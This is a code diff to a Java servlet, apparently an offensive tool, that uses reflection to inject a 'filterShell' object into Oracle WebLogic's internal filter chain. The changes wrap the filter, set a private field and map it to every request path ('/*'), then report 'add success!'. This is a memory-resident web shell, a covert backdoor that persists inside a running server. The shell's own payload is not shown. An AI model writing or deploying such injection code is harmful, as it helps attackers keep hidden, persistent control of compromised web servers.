@@ -55,11 +55,13 @@ public class AddShellWeblogicFilter extends HttpServlet {
 
             //用wrapper包装filter
             Class<?> clz = Class.forName("weblogic.servlet.internal.FilterWrapper");
-
             Constructor constructor = clz.getDeclaredConstructor(String.class,String.class,Map.class,WebAppServletContext.class);
             constructor.setAccessible(true);
-
             FilterWrapper filterWrapper = (FilterWrapper) constructor.newInstance(filterShell.getClass().getName(),filterShell.getClass().getName(),null,context);
+            //设置wrapper包装的filter对象
+            Field ff = clz.getDeclaredField("filter");
+            ff.setAccessible(true);
+            ff.set(filterWrapper,filterShell);
 
             //添加到filters
             filterWrapperMap.put(filterShell.getClass().getName(),filterWrapper);
@@ -69,7 +71,9 @@ public class AddShellWeblogicFilter extends HttpServlet {
             Class<?> fiz = Class.forName("weblogic.servlet.internal.FilterManager$FilterInfo");
             Constructor constructor1 = fiz.getDeclaredConstructor(String.class, URLMapping.class,WebAppServletContext.class, EnumSet.class);
             constructor1.setAccessible(true);
-            filterInfos.add(constructor1.newInstance(filterShell.getClass().getName(),new ServletMapping(),context,null));
+            ServletMapping servletMapping = new ServletMapping();
+            servletMapping.put("/*",filterShell.getClass().getName());
+            filterInfos.add(constructor1.newInstance(filterShell.getClass().getName(),servletMapping,context,null));
 
 
             resp.getWriter().write("add success!");
